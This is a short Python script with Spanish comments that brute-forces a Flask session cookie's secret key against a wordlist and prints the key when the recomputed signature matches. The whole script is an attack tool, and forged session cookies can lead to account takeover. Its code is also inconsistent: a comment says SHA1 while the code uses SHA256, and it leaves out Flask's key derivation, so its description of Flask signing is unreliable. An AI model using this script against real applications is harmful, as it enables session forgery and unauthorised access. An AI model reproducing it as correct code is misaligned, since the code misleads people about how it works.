import hmac
import hashlib
import base64
import sys

def crack_flask_session(cookie, wordlist):
    # En Flask, la cookie es: payload.timestamp.signature
    # Intentaremos recrear la firma usando el payload + timestamp + secret_key
    try:
        parts = cookie.split('.')
        if len(parts) != 3:
            print("[-] Formato de cookie no válido.")
            return

        data_to_sign = parts[0] + "." + parts[1]
        signature_to_match = parts[2]

        print(f"[*] Iniciando ataque con diccionario: {wordlist}")
        
        with open(wordlist, 'r', encoding='latin-1') as f:
            for line in f:
                secret = line.strip()
                # Flask usa una variante de HMAC-SHA1 o SHA256 dependiendo de la versión
                # Intentamos con SHA1 que es el estándar clásico de Flask
                attempt = hmac.new(secret.encode(), data_to_sign.encode(), hashlib.sha256).digest()
                attempt_b64 = base64.urlsafe_b64encode(attempt).decode().replace('=', '')

                if attempt_b64 == signature_to_match:
                    print(f"\n[+] CLAVE ENCONTRADA: {secret}")
                    return True
        
        print("\n[-] No se encontró la clave en el diccionario.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python simple_crack.py <COOKIE> <DICCIONARIO>")
    else:
        crack_flask_session(sys.argv[1], sys.argv[2])
